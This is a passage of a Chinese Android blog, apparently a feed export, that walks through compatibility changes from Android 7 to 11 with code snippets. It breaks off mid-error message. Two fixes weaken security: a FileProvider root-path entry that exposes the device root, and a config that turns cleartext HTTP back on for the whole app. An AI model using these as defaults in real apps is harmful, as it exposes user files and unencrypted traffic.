class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:name=&quot;android.support.v4.content.FileProvider&quot;</span><br><span class="line">    android:authorities=&quot;app的包名.fileProvider&quot;</span><br><span class="line">    android:grantUriPermissions=&quot;true&quot;</span><br><span class="line">    android:exported=&quot;false&quot;&gt;</span><br><span class="line">    &lt;meta-data</span><br><span class="line">        android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot;</span><br><span class="line">        android:resource=&quot;@xml/file_paths&quot; /&gt;</span><br><span class="line">&lt;/provider&gt;</span><br><span class="line">&lt;!--androidx版本类路径为：androidx.core.content.FileProvider--&gt;</span><br></pre></td></tr></table></figure><p>2）编写xml文件，确定可访问的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;paths xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;</span><br><span class="line"> //代表设备的根目录new File(&quot;/&quot;);</span><br><span class="line">    &lt;root-path name=&quot;root&quot; path=&quot;.&quot; /&gt; </span><br><span class="line">    //context.getFilesDir()</span><br><span class="line">    &lt;files-path name=&quot;files&quot; path=&quot;.&quot; /&gt; </span><br><span class="line">    //context.getCacheDir()</span><br><span class="line">    &lt;cache-path name=&quot;cache&quot; path=&quot;.&quot; /&gt; </span><br><span class="line">    //Environment.getExternalStorageDirectory()</span><br><span class="line">    &lt;external-path name=&quot;external&quot; path=&quot;.&quot; /&gt;</span><br><span class="line">    //context.getExternalFilesDirs()</span><br><span class="line">    &lt;external-files-path name=&quot;name&quot; path=&quot;path&quot; /&gt;</span><br><span class="line">    //getExternalCacheDirs()</span><br><span class="line">     &lt;external-cache-path name=&quot;name&quot; path=&quot;path&quot; /&gt;</span><br><span class="line">&lt;/paths&gt;</span><br></pre></td></tr></table></figure><p>3）使用FileProvider</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;</span><br><span class="line">    Uri uri = FileProvider.getUriForFile(CameraActivity.this, &quot;app的包名.fileProvider&quot;, photoFile);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Uri uri = Uri.fromFile(photoFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Android8-0"><a href="#Android8-0" class="headerlink" title="Android8.0"></a>Android8.0</h3><blockquote><p>修改运行时权限错误</p></blockquote><p>在 Android 8.0 之前，如果应用在运行时请求权限并且被授予该权限，系统会错误地将属于同一权限组并且在清单中注册的其他权限也一起授予应用。对于针对 Android 8.0 的应用，系统只会授予应用明确请求的权限。然而，一旦用户为应用授予某个权限，则所有后续对该权限组中权限的请求都将被自动批准。</p><p>也就是说，以前你申请了READ_EXTERNAL_STORAGE权限，应用会同时给你授予同权限组的WRITE_EXTERNAL_STORAGE权限。如果Android8.0以上，只会给你授予你请求的READ_EXTERNAL_STORAGE权限。如果需要WRITE_EXTERNAL_STORAGE权限，还要单独申请，不过系统会立即授予，不会提示。</p><blockquote><p>修改通知</p></blockquote><p>Android 8.0 对于通知修改了很多，比如通知渠道、通知标志、通知超时、背景颜色。其中比较重要的就是通知渠道，其允许您为要显示的每种通知类型创建用户可自定义的渠道。</p><p>这样的好处就是对于某个应用可以把权限分成很多类，用户来控制是否显示哪些类别的通知。而开发者要做的就是必须设置这个渠道id，否则通知可能会失效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private void createNotificationChannel() &#123;</span><br><span class="line">        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line"></span><br><span class="line">            NotificationManager notificationManager = (NotificationManager)</span><br><span class="line">                    getSystemService(Context.NOTIFICATION_SERVICE);</span><br><span class="line"></span><br><span class="line">            //分组（可选）</span><br><span class="line">            //groupId要唯一</span><br><span class="line">            String groupId = &quot;group_001&quot;;</span><br><span class="line">            NotificationChannelGroup group = new NotificationChannelGroup(groupId, &quot;广告&quot;);</span><br><span class="line"></span><br><span class="line">            //创建group</span><br><span class="line">            notificationManager.createNotificationChannelGroup(group);</span><br><span class="line"></span><br><span class="line">            //channelId要唯一</span><br><span class="line">            String channelId = &quot;channel_001&quot;;</span><br><span class="line"></span><br><span class="line">            NotificationChannel adChannel = new NotificationChannel(channelId,</span><br><span class="line">                    &quot;推广信息&quot;, NotificationManager.IMPORTANCE_DEFAULT);</span><br><span class="line">            //补充channel的含义（可选）</span><br><span class="line">            adChannel.setDescription(&quot;推广信息&quot;);</span><br><span class="line">            //将渠道添加进组（先创建组才能添加）</span><br><span class="line">            adChannel.setGroup(groupId);</span><br><span class="line">            //创建channel</span><br><span class="line">            notificationManager.createNotificationChannel(adChannel);</span><br><span class="line"></span><br><span class="line">   //创建通知时，标记你的渠道id</span><br><span class="line">            Notification notification = new Notification.Builder(MainActivity.this, channelId)</span><br><span class="line">                    .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class="line">                    .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher))</span><br><span class="line">                    .setContentTitle(&quot;一条新通知&quot;)</span><br><span class="line">                    .setContentText(&quot;这是一条测试消息&quot;)</span><br><span class="line">                    .setAutoCancel(true)</span><br><span class="line">                    .build();</span><br><span class="line">            notificationManager.notify(1, notification);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>悬浮窗</p></blockquote><p>Android8.0以上必须使用新的窗口类型(TYPE_APPLICATION_OVERLAY)才能显示提醒悬浮窗：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">    mWindowParams.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    mWindowParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>不允许安装未知来源的应用</p></blockquote><p>Android 8.0去除了“允许未知来源”选项，所以如果我们的App有安装App的功能（检查更新之类的），那么会无法正常安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.REQUEST_INSTALL_PACKAGES&quot;/&gt;</span><br><span class="line"></span><br><span class="line">private void installAPK()&#123;</span><br><span class="line"></span><br><span class="line">        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">            boolean hasInstallPermission = getPackageManager().canRequestPackageInstalls();</span><br><span class="line">            if (hasInstallPermission) &#123;</span><br><span class="line">                //安装应用</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                //跳转至“安装未知应用”权限界面，引导用户开启权限</span><br><span class="line">                Uri selfPackageUri = Uri.parse(&quot;package:&quot; + this.getPackageName());</span><br><span class="line">                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, selfPackageUri);</span><br><span class="line">                startActivityForResult(intent, 100);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            //安装应用</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //接收“安装未知应用”权限的开启结果</span><br><span class="line">    @Override</span><br><span class="line">    protected void onActivityResult(int requestCode, int resultCode, Intent data) &#123;</span><br><span class="line">        super.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">        if (requestCode == 100) &#123;</span><br><span class="line">            installAPK();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>Only fullscreen opaque activities can request orientation</p></blockquote><p>只有全屏不透明的activity才可以设置方向。这应该是个bug，在Android8.0中出现，8.1中被修复。</p><p>我们的处理办法就是要么去掉设置方向的代码，要么舍弃透明效果。</p><h3 id="Android9-0"><a href="#Android9-0" class="headerlink" title="Android9.0"></a>Android9.0</h3><blockquote><p>在9.0中默认情况下启用网络传输层安全协议 (TLS)，默认情况下已停用明文支持。也就是不允许使用http请求，要求使用https。解决办法就是添加网络安全配置：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;application android:networkSecurityConfig=&quot;@xml/network_security_config&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;network-security-config&gt;</span><br><span class="line"> &lt;base-config cleartextTrafficPermitted=&quot;true&quot; /&gt;</span><br><span class="line">&lt;/network-security-config&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--或者在AndroidManifest.xml中配置：</span><br><span class="line">android:usesCleartextTraffic=&quot;true&quot;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><blockquote><p>移除Apache HTTP 客户端</p></blockquote><p>在6.0中取消了对Apache HTTP 客户端的支持，Android9.0中直接移除了该库，要使用的话需要添加配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-library android:name=&quot;org.apache.http.legacy&quot; android:required=&quot;false&quot;/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>前台服务调用</p></blockquote><p>Android 9.0 要求创建一个前台服务需要请求 FOREGROUND_SERVICE 权限，否则系统会引发 SecurityException。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.FOREGROUND_SERVICE&quot; /&gt;</span><br><span class="line"></span><br><span class="line">if (android.os.Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.O) &#123;</span><br><span class="line">    startForegroundService(intentService);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    startService(intentService);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>不能在非Acitivity环境中启动Activity</p></blockquote><p>在9.0 中，不能直接非 Activity 环境中（比如Service，Application）启动 Activity，否则会崩溃报错，解决办法就是加上FLAG_ACTIVITY_NEW_TASK</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent(this, TestActivity.class);</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><h3 id="Android10"><a href="#Android10" class="headerlink" title="Android10"></a>Android10</h3><blockquote><p>分区存储</p></blockquote><p>Android10中默认开启了分区存储，也就是沙盒模式。应用只能看到本应用专有的目录（通过 Context.getExternalFilesDir() 访问）以及特定类型的媒体。</p><p>如果需要关闭这个功能可以配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:requestLegacyExternalStorage=&quot;true&quot;</span><br></pre></td></tr></table></figure><p>分区存储下，访问文件的方法：</p><p>1）应用专属目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//分区存储空间</span><br><span class="line">val file = File(context.filesDir, filename)</span><br><span class="line"></span><br><span class="line">//应用专属外部存储空间</span><br><span class="line">val appSpecificExternalDir = File(context.getExternalFilesDir(), filename)</span><br></pre></td></tr></table></figure><p>2）访问公共媒体目录文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">val cursor = contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, &quot;$&#123;MediaStore.MediaColumns.DATE_ADDED&#125; desc&quot;)</span><br><span class="line">if (cursor != null) &#123;</span><br><span class="line">    while (cursor.moveToNext()) &#123;</span><br><span class="line">        val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))</span><br><span class="line">        val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)</span><br><span class="line">        println(&quot;image uri is $uri&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    cursor.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）SAF(存储访问框架–Storage Access Framework)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">val intent = Intent(Intent.ACTION_OPEN_DOCUMENT)</span><br><span class="line">intent.addCategory(Intent.CATEGORY_OPENABLE)</span><br><span class="line">intent.type = &quot;image/*&quot;</span><br><span class="line">startActivityForResult(intent, 100)</span><br><span class="line"></span><br><span class="line">@RequiresApi(Build.VERSION_CODES.KITKAT)</span><br><span class="line">override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) &#123;</span><br><span class="line">    super.onActivityResult(requestCode, resultCode, data)</span><br><span class="line">    if (data == null || resultCode != Activity.RESULT_OK) return</span><br><span class="line">    if (requestCode == 100) &#123;</span><br><span class="line">        val uri = data.data</span><br><span class="line">        println(&quot;image uri is $uri&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>权限再次升级</p></blockquote><p>从Android10开始普通应用不再允许请求权限android.permission.READ_PHONE_STATE。而且，无论你的App是否适配过Android Q（既targetSdkVersion是否大于等于29），均无法再获取到设备IMEI等设备信息。</p><p>如果Android10以下设备获取设备IMEI等信息，可以配置最大sdk版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; android:maxSdkVersion=&quot;28&quot;/&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android11最全适配实践指南</title>
      <link href="/2022/09/03/2022-09-03/"/>
      <url>/2022/09/03/2022-09-03/</url>
      
        <content type="html"><![CDATA[<ul><li>以<strong>Android11</strong> 为目标版本的应用（<strong>targetSdkVersion&gt;=30</strong>才有影响）</li><li>所有应用在<strong>Android11</strong>设备上适配改动（无论targetSdkVersion是多少，只要在<strong>Android11</strong>设备上运行的应用都有影响）</li></ul><p>为什么先说<strong>targetSdkVersion&gt;=30</strong>的模块呢？因为一般来说为了Google为了让我们更长时间适应新的内容以及保障线上应用的稳定，都会把改动大的，需要花时间适配的内容放到新的<strong>targetSdkVersion</strong>对应的应用上，如果你暂时没有适配<strong>targetSdkVersion30</strong>的需求，也可以看看第二模块，看看是否有涉及你的应用相关内容。</p><h4 id="适配targetSdkVersion30"><a href="#适配targetSdkVersion30" class="headerlink" title="适配targetSdkVersion30"></a>适配targetSdkVersion30</h4><p>此模块的修改内容只针对<strong>targetSdkVersion 30</strong>或者以上才生效。</p><h4 id="分区存储强制执行"><a href="#分区存储强制执行" class="headerlink" title="分区存储强制执行"></a>分区存储强制执行</h4><blockquote><p>对外部存储目录的访问仅限于应用专属目录，以及应用已创建的特定类型的媒体。</p></blockquote><p>关于分区存储，在<strong>Android10</strong>就已经推行了，简单的说，就是应用对于文件的读写只能在沙盒环境，也就是属于自己应用的目录里面读写。其他媒体文件可以通过<strong>MediaStore</strong>进行访问。</p><p>但是在<strong>android10</strong>的时候，Google还是为开发者考虑，留了一手。在<strong>targetSdkVersion = 29</strong>应用中，设置<strong>android:requestLegacyExternalStorage=”true”<strong>，就可以不启动分区存储，让以前的文件读取正常使用。但是</strong>targetSdkVersion = 30</strong>中不行了，强制开启分区存储。</p><p>当然，作为人性化的android，还是为开发者留了一小手，如果是覆盖安装呢，可以增加<strong>android:preserveLegacyExternalStorage=”true”<strong>，暂时关闭分区存储，好让开发者完成数据迁移的工作。为什么是暂时呢？因为只要</strong>卸载重装</strong>，就会失效了。以下是关于分区存储会遇到的所有情况，给大家罗列出来了，先上代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fun saveFile() &#123;</span><br><span class="line">    if (checkPermission()) &#123;</span><br><span class="line">        //getExternalStoragePublicDirectory被弃用，分区存储开启后就不允许访问了</span><br><span class="line">        val filePath = Environment.getExternalStoragePublicDirectory(&quot;&quot;).toString() + &quot;/test3.txt&quot;</span><br><span class="line">        val fw = FileWriter(filePath)</span><br><span class="line">        fw.write(&quot;hello world&quot;)</span><br><span class="line">        fw.close()</span><br><span class="line">        showToast(&quot;文件写入成功&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分情况运行：</p><ol><li><strong>targetSdkVersion = 28</strong>，运行后正常读写。</li><li><strong>targetSdkVersion = 29</strong>，不删除应用，targetSdkVersion 由28修改到29，覆盖安装，运行后正常读写。</li><li><strong>targetSdkVersion = 29</strong>，删除应用，重新运行，读写报错，程序崩溃（open failed: EACCES (Permission denied)）</li><li><strong>targetSdkVersion = 29</strong>，添加android:requestLegacyExternalStorage=”true”（不启用分区存储），读写正常不报错</li><li><strong>targetSdkVersion = 30</strong>，不删除应用，targetSdkVersion 由29修改到30，读写报错，程序崩溃（open failed: EACCES (Permission denied)）</li><li><strong>targetSdkVersion = 30</strong>，不删除应用，targetSdkVersion 由29修改到30，增加android:preserveLegacyExternalStorage=”true”，读写正常不报错</li><li><strong>targetSdkVersion = 30</strong>，删除应用，重新运行，读写报错，程序崩溃（open failed: EACCES (Permission denied)）</li></ol><p>那到底应该怎么改呢？三种方法访问文件：</p><ol><li>应用专属目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//分区存储空间</span><br><span class="line">val file = File(context.filesDir, filename)</span><br><span class="line"></span><br><span class="line">//应用专属外部存储空间</span><br><span class="line">val appSpecificExternalDir = File(context.getExternalFilesDir(), filename)</span><br></pre></td></tr></table></figure><ol start="2"><li>访问公共媒体目录文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">val cursor = contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, &quot;$&#123;MediaStore.MediaColumns.DATE_ADDED&#125; desc&quot;)</span><br><span class="line">if (cursor != null) &#123;</span><br><span class="line">    while (cursor.moveToNext()) &#123;</span><br><span class="line">        val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))</span><br><span class="line">        val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)</span><br><span class="line">        println(&quot;image uri is $uri&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    cursor.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>SAF(存储访问框架–Storage Access Framework)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">val intent = Intent(Intent.ACTION_OPEN_DOCUMENT)</span><br><span class="line">intent.addCategory(Intent.CATEGORY_OPENABLE)</span><br><span class="line">intent.type = &quot;image/*&quot;</span><br><span class="line">startActivityForResult(intent, 100)</span><br><span class="line"></span><br><span class="line">@RequiresApi(Build.VERSION_CODES.KITKAT)</span><br><span class="line">override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) &#123;</span><br><span class="line">    super.onActivityResult(requestCode, resultCode, data)</span><br><span class="line">    if (data == null || resultCode != Activity.RESULT_OK) return</span><br><span class="line">    if (requestCode == 100) &#123;</span><br><span class="line">        val uri = data.data</span><br><span class="line">        println(&quot;image uri is $uri&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说到这里可能又有人问了，那我的应用就是个手机管理器，总不能不让我清其他应用的缓存了吧，有办法！Android提供了两个intent入口：</p><ul><li>调用ACTION_MANAGE_STORAGE intent 操作检查可用空间。</li><li>调用ACTION_CLEAR_APP_CACHE intent 操作清除所有缓存。</li></ul><p>说来说去，反正应用数据私有化是大势所趋，还是早点适配分区存储，别等以后手机只有沙盒机制的时候，就来不及了。</p><h3 id="媒体文件访问权限"><a href="#媒体文件访问权限" class="headerlink" title="媒体文件访问权限"></a>媒体文件访问权限</h3><blockquote><p>为了在保证用户隐私的同时可以更轻松地访问媒体，Android 11 增加了以下功能。执行批量操作和使用直接文件路径和原生库访问文件。</p></blockquote><ol><li>执行批量操作<br>这里的批量操作指的是Android 11 向 <strong>MediaStore API</strong> 中添加了多种方法，用于简化特定媒体文件更改流程（例如在原位置编辑照片），分别是：</li></ol><ul><li><strong>createWriteRequest()</strong> 用户向应用授予对指定媒体文件组的写入访问权限的请求。</li><li>**createFavoriteRequest()**用户将设备上指定的媒体文件标记为“收藏”的请求。对该文件具有读取访问权限的任何应用都可以看到用户已将该文件标记为“收藏”。</li><li><strong>createTrashRequest()</strong> 用户将指定的媒体文件放入设备垃圾箱的请求。垃圾箱中的内容会在系统定义的时间段后被永久删除。</li><li><strong>createDeleteRequest()</strong> 用户立即永久删除指定的媒体文件（而不是先将其放入垃圾箱）的请求。</li></ul><p>直接看个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">val urisToModify = listOf(uri,uri,...)</span><br><span class="line">val editPendingIntent = MediaStore.createWriteRequest(contentResolver,</span><br><span class="line">        urisToModify)</span><br><span class="line"></span><br><span class="line">// Launch a system prompt requesting user permission for the operation.</span><br><span class="line">startIntentSenderForResult(editPendingIntent.intentSender, EDIT_REQUEST_CODE,</span><br><span class="line">    null, 0, 0, 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">override fun onActivityResult(requestCode: Int, resultCode: Int,</span><br><span class="line">                 data: Intent?) &#123;</span><br><span class="line">    when (requestCode) &#123;</span><br><span class="line">        EDIT_REQUEST_CODE -&gt;</span><br><span class="line">            if (resultCode == Activity.RESULT_OK) &#123;</span><br><span class="line">                /* Edit request granted; proceed. */</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                /* Edit request not granted; explain to the user. */</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入uri的集合，获取用户的同意后，就可以进行操作了。</p><ol start="2"><li>直接文件路径和原生库访问文件</li></ol><p>没错！Android11又恢复了使用<strong>直接文件路径</strong>访问访问媒体文件！哈哈，这样就方便多了。也就是除了 <strong>MediaStore API</strong>之外还有两种方式可以访问媒体文件：</p><ul><li>File API。</li><li>原生库，例如 fopen()。</li></ul><p>那<strong>Android10</strong>咋办呢？？要不就用<strong>MediaStore</strong>，要不就直接把分区存储关了吧（requestLegacyExternalStorage=true）</p><h3 id="所有文件访问权限"><a href="#所有文件访问权限" class="headerlink" title="所有文件访问权限"></a>所有文件访问权限</h3><p>虽然说了这么多，但是还有些应用就要访问所有文件，比如杀毒软件，文件管理器。放心，有办法！<strong>MANAGE_EXTERNAL_STORAGE</strong> 这不来了吗。<br>这个权限就是用来获取<strong>所有文件</strong>的管理权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.MANAGE_EXTERNAL_STORAGE&quot; /&gt;</span><br><span class="line"></span><br><span class="line">val intent = Intent()</span><br><span class="line">intent.action= Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION</span><br><span class="line">startActivity(intent)</span><br><span class="line"></span><br><span class="line">//判断是否获取MANAGE_EXTERNAL_STORAGE权限：</span><br><span class="line">val isHasStoragePermission= Environment.isExternalStorageManager()</span><br></pre></td></tr></table></figure><p>来张截图过过瘾：</p><p><img src="/images/20220903/20220903001.jpg"></p><h3 id="电话号码相关权限"><a href="#电话号码相关权限" class="headerlink" title="电话号码相关权限"></a>电话号码相关权限</h3><blockquote><p>Android 11 更改了您的应用在读取电话号码时使用的与电话相关的权限。</p></blockquote><p>具体改了什么呢？其实就是两个API：</p><ul><li>TelecomManager 类中的 <strong>getLine1Number()</strong> 方法</li><li>TelecomManager 类中的 <strong>getMsisdn()</strong> 方法</li></ul><p>也就是当用到这两个API的时候，原来的<strong>READ_PHONE_STATE</strong>权限不管用了，需要<strong>READ_PHONE_NUMBERS</strong>权限才行。</p><p>下面具体说说，<strong>targetSdkVersion</strong>修改到30，然后运行一个获取电话号码的程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_PHONE_STATE), 100)</span><br><span class="line"></span><br><span class="line">btn2.setOnClickListener &#123;</span><br><span class="line">    val tm = this.applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager</span><br><span class="line">    val phoneNumber = tm.line1Number</span><br><span class="line">    showToast(phoneNumber)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>崩溃了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.SecurityException: getLine1NumberForDisplay: Neither user 10151 nor current process has 